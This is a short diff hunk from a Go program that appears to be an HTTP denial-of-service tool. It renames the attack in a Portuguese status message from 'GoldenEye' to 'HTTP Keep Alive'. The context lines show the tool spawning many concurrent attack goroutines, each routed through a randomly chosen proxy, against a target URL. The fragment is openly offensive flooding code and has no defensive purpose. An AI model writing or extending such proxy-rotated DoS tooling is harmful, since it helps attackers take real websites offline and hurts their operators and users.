@@ -209,7 +209,7 @@ func main() {
     ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
     defer cancel()
     stopChan := make(chan struct{})
-    fmt.Println("Iniciando ataque GoldenEye em", targetURL)
+    fmt.Println("Iniciando ataque HTTP Keep Alive em", targetURL)
     for i := 0; i < numConnections; i++ {
         if len(proxies) > 0 {
             go attack(ctx, proxies[rand.Intn(len(proxies))], dialTimeout, tlsTimeout, clientTimeout, stopChan)
